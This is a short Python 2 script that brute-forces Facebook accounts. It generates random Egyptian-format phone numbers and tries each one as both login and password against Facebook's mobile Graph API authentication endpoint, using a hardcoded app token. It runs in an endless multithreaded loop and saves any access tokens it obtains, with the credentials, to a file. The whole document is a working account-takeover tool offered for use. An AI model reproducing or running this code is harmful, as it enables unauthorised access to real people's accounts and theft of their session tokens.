import requests
from random import randint
import string
import random
import urllib
import StringIO
import gzip
import json
import time
import thread



def startbrute(number, ss):
    r = requests.get('https://b-graph.facebook.com/?include_headers=false&locale=ar_Ar&client_country_code=EG&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&method=post&batch=%5B%7B"method"%3A"POST"%2C"body"%3A"format%3Djson%26device_id%3D=0cd272a7-17dc-4766-958e-5b48799250bf%26email%3D=2' + number +'%26password%3D=' + number +'%26credentials_type%3Dpassword%26generate_session_cookies%3D1%26error_detail_type%3Dbutton_with_disabled%26generate_machine_id%3D1%26locale%3Den_US%26client_country_code%3DTH%26fb_api_req_friendly_name%3Dauthenticate"%2C"name"%3A"authenticate"%2C"omit_response_on_success"%3Afalse%2C"relative_url"%3A"method%2Fauth.login"%7D%5D&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authLogin%27')
    if 'access_token' in json.loads (r.json ()[0]['body']):
        print "yes"
        f = open ("Tokens.txt", "a+")
        f.write (json.loads (r.json ()[0]['body'])['access_token'] + ' - Username:' + number + ' - Password:' + number + "\n\n")
        f.close ()

    else:
        y = open ("Temp.txt", "a+")
        y.write (str (r.json ()) + "\n")
        y.close ()




while True:
        number = "0" + str(random.randint(10,12)) + str(random.randint(10000000,99999999))
        print number
	thread.start_new_thread( startbrute, (number, 4, ) )
	time.sleep(0.07)
